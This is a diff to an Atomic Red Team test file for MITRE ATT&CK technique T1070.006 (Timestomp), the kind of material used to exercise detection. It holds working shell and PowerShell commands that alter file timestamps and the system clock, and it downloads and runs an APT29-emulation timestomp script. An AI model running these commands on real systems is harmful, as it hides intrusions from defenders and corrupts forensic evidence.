@@ -1,5 +1,5 @@
 attack_technique: T1070.006
-display_name: 'Indicator Removal on Host: Timestomp'
+display_name: "Indicator Removal: Timestomp"
 atomic_tests:
 - name: Set a file's access timestamp
   auto_generated_guid: 5f9113d5-ed75-47ed-ba23-ea3573d05810
@@ -11,12 +11,22 @@ atomic_tests:
   input_arguments:
     target_filename:
       description: Path of file that we are going to stomp on last access time
-      type: Path
-      default: /opt/filename
+      type: path
+      default: /tmp/T1070.006-access.txt
+  dependencies:
+  - description: |
+      The file must exist in order to be timestomped
+    prereq_command: |
+      test -e #{target_filename} && exit 0 || exit 1
+    get_prereq_command: |
+      echo 'T1070.006 file access timestomp test' > #{target_filename}
   executor:
     command: |
       touch -a -t 197001010000.00 #{target_filename}
+    cleanup_command: |
+      rm -f #{target_filename}
     name: sh
+
 - name: Set a file's modification timestamp
   auto_generated_guid: 20ef1523-8758-4898-b5a2-d026cc3d2c52
   description: |
@@ -27,11 +37,20 @@ atomic_tests:
   input_arguments:
     target_filename:
       description: Path of file that we are going to stomp on last access time
-      type: Path
-      default: /opt/filename
+      type: path
+      default: /tmp/T1070.006-modification.txt
+  dependencies:
+  - description: |
+      The file must exist in order to be timestomped
+    prereq_command: |
+      test -e #{target_filename} && exit 0 || exit 1
+    get_prereq_command: |
+      echo 'T1070.006 file modification timestomp test' > #{target_filename}
   executor:
     command: |
       touch -m -t 197001010000.00 #{target_filename}
+    cleanup_command: |
+      rm -f #{target_filename}
     name: sh
 - name: Set a file's creation timestamp
   auto_generated_guid: 8164a4a6-f99c-4661-ac4f-80f5e4e78d2b
@@ -46,15 +65,18 @@ atomic_tests:
   input_arguments:
     target_filename:
       description: Path of file that we are going to stomp on last access time
-      type: Path
-      default: /opt/filename
+      type: path
+      default: /tmp/T1070.006-creation.txt
   executor:
+    elevation_required: true
     command: |
-      NOW=$(date)
-      date -s "1970-01-01 00:00:00"
+      NOW=$(date +%m%d%H%M%Y)
+      date 010100001971
       touch #{target_filename}
-      date -s "$NOW"
+      date "$NOW"
       stat #{target_filename}
+    cleanup_command: |
+      rm -f #{target_filename}
     name: sh
 - name: Modify file timestamps using reference file
   auto_generated_guid: 631ea661-d661-44b0-abdb-7a7f3fc08e50
@@ -68,15 +90,18 @@ atomic_tests:
   input_arguments:
     target_file_path:
       description: Path of file to modify timestamps of
-      type: Path
-      default: /opt/filename
+      type: path
+      default: /tmp/T1070.006-reference.txt
     reference_file_path:
       description: Path of reference file to read timestamps from
-      type: Path
+      type: path
       default: /bin/sh
   executor:
     command: |
+      touch #{target_file_path}
       touch -acmr #{reference_file_path} #{target_file_path}
+    cleanup_command: |
+      rm -f #{target_file_path}
     name: sh
 - name: Windows - Modify file creation timestamp with PowerShell
   auto_generated_guid: b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c
@@ -88,26 +113,24 @@ atomic_tests:
   input_arguments:
     target_date_time:
       description: Date/time to replace original timestamps with
-      type: String
+      type: string
       default: 01/01/1970 00:00:00
     file_path:
       description: Path of file to change creation timestamp
-      type: Path
-      default: $env:TEMP\T1551.006_timestomp.txt
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
       A file must exist at the path (#{file_path}) to change the creation time on
     prereq_command: |
-      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path} -Force | Out-Null
-      Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
+      New-Item -Path "#{file_path}" -Force | Out-Null
+      Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null
   executor:
     command: |
-      Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}" }
-    cleanup_command: |
-      Remove-Item #{file_path} -Force -ErrorAction Ignore
+      Get-ChildItem "#{file_path}" | % { $_.CreationTime = "#{target_date_time}" }
     name: powershell
 - name: Windows - Modify file last modified timestamp with PowerShell
   auto_generated_guid: f8f6634d-93e1-4238-8510-f8a90a20dcf2
@@ -119,26 +142,24 @@ atomic_tests:
   input_arguments:
     target_date_time:
       description: Date/time to replace original timestamps with
-      type: String
+      type: string
       default: 01/01/1970 00:00:00
     file_path:
       description: Path of file to change modified timestamp
-      type: Path
-      default: $env:TEMP\T1551.006_timestomp.txt
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
       A file must exist at the path (#{file_path}) to change the modified time on
     prereq_command: |
-      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path} -Force | Out-Null
-      Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
+      New-Item -Path "#{file_path}" -Force | Out-Null
+      Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null
   executor:
     command: |
-      Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}" }
-    cleanup_command: |
-      Remove-Item #{file_path} -Force -ErrorAction Ignore
+      Get-ChildItem "#{file_path}" | % { $_.LastWriteTime = "#{target_date_time}" }
     name: powershell
 - name: Windows - Modify file last access timestamp with PowerShell
   auto_generated_guid: da627f63-b9bd-4431-b6f8-c5b44d061a62
@@ -150,26 +171,24 @@ atomic_tests:
   input_arguments:
     target_date_time:
       description: Date/time to replace original timestamps with
-      type: String
+      type: string
       default: 01/01/1970 00:00:00
     file_path:
       description: Path of file to change last access timestamp
-      type: Path
-      default: $env:TEMP\T1551.006_timestomp.txt
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      A file must exist at the path (#{file_path}) to change the last access time on
+      A file must exist at the path ("#{file_path}") to change the last access time on
     prereq_command: |
-      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path} -Force | Out-Null
-      Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
+      New-Item -Path "#{file_path}" -Force | Out-Null
+      Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null
   executor:
     command: |
-      Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}" }
-    cleanup_command: |
-      Remove-Item #{file_path} -Force -ErrorAction Ignore
+      Get-ChildItem "#{file_path}" | % { $_.LastAccessTime = "#{target_date_time}" }
     name: powershell
 - name: Windows - Timestomp a File
   auto_generated_guid: d7512c33-3a75-4806-9893-69abc3ccdd43
@@ -184,27 +203,83 @@ atomic_tests:
   input_arguments:
     file_path:
       description: File path for timestomp payload
-      type: String
-      default: $env:appdata\Microsoft
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads
   dependency_executor_name: powershell
   dependencies:
   - description: |
       timestomp.ps1 must be present in #{file_path}.
     prereq_command: |
-      if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}\timestomp.ps1") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
+      Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1" -UseBasicParsing
   - description: |
       kxwn.lock must be present in #{file_path}.
     prereq_command: |
       if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path}\kxwn.lock -ItemType File
+      New-Item -Path "#{file_path}\kxwn.lock" -ItemType File
   executor:
     command: |
-      import-module #{file_path}\timestomp.ps1
+      import-module "#{file_path}\timestomp.ps1"
       timestomp -dest "#{file_path}\kxwn.lock"
-    cleanup_command: |-
-      Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
-      Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore
     name: powershell
+- name: MacOS - Timestomp Date Modified
+  auto_generated_guid: 87fffff4-d371-4057-a539-e3b24c37e564
+  description: |
+    Stomps on the modification timestamp of a file using MacOS's SetFile utility
+  supported_platforms: 
+    - macos
+  input_arguments: 
+    target_filename:
+      description: |
+        Path of file that we are going to stomp on last modified time
+      type: path
+      default: /tmp/T1070.006-modified.txt
+    target_date:
+      description: Date to replace original timestamps with
+      type: string
+      default: 01/01/1970
+  dependencies:
+  - description: |
+      The file must exist in order to be timestomped
+    prereq_command: |
+      test -e #{target_filename} && exit 0 || exit 1
+    get_prereq_command: |
+      echo 'T1070.006 MacOS file modified timestomp test' > #{target_filename}
+  executor:
+    name: sh
+    command: |
+      SetFile -m #{target_date} #{target_filename}
+    cleanup_command: |
+      rm -f #{target_filename}
+- name: Event Log Manipulations- Time slipping via Powershell
+  auto_generated_guid: 7bcf83bf-f5ef-425c-9d9a-71618ad9ed12
+  description: |-
+    Changes the system time on the computer to a time that you specify. It involves altering the system’s clock or adjusting the dates of files, affecting timestamp integrity within Event Logs. This technique can disrupt the sequence of logged events, complicating incident analysis and forensics. 
+    Reference - 
+    https://detect.fyi/event-log-manipulations-1-time-slipping-55bf95631c40
+    https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-date?view=powershell-7.4
+  supported_platforms:
+  - windows
+  input_arguments:
+    days_to_modify:
+      description: Value to which system time will update
+      type: string
+      default: "3"
+  executor:
+    command: |
+      try{ 
+        Set-Date -Date (Get-Date).AddDays(#{days_to_modify})
+        Add-Content "$env:APPDATA\slipDays.bak" #{days_to_modify}
+      }
+      catch {exit 1}
+    cleanup_command: |
+      if(Test-Path "$env:APPDATA\slipDays.bak" ){
+        foreach($line in (get-content $env:APPDATA\slipDays.bak)){
+          Set-Date -Date (Get-Date).AddDays(-$line)
+        }
+        rm "$env:APPDATA\slipDays.bak"
+      }
+    name: powershell
+    elevation_required: true
